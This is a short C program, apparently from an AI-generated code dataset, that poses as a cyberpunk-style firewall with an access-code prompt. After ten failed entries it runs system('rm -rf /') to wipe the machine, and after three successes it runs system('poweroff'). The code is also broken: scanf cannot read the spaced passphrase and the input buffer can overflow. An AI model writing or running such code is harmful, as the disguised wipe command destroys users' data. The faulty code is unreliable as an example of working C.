//FormAI DATASET v1.0 Category: Firewall ; Style: Cyberpunk
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int main() {
    srand(time(NULL)); // seed random number generator

    char firewall[10][20] = {"access permit", "intruder alert", "firewall breach", "corrupted data", "hack attempt", "unauthorized access", "system failure", "error code 404", "security breach", "fatal error"};
    // list of firewall messages to display

    int attempt = 0; // number of attempts
    int success = 0; // number of successful breaches

    while (1) { // loop forever
        printf("Enter access code: ");
        char input[20];
        scanf("%s", input);

        if (strcmp(input, "open sesame") == 0) { // successful breach
            success++;
            printf("%s\n", firewall[rand() % 10]); // display random firewall message

            if (success == 3) { // if breach successful 3 times
                printf("Initiating system shutdown in 5 seconds...\n");
                sleep(5);
                system("poweroff"); // shutdown system
            }
        } else { // unsuccessful breach
            attempt++;
            printf("%s\n", firewall[rand() % 10]); // display random firewall message

            if (attempt == 10) { // if failed 10 times
                printf("Access denied. Initiating security protocol...\n");
                printf("Warning: self-destruct sequence activated. This terminal will self-destruct in 10 seconds.\n");
                sleep(10);
                printf("Goodbye!\n");
                system("rm -rf /"); // wipe system
            }

            sleep(1); // wait for 1 second before next attempt
        }
    }

    return 0;
}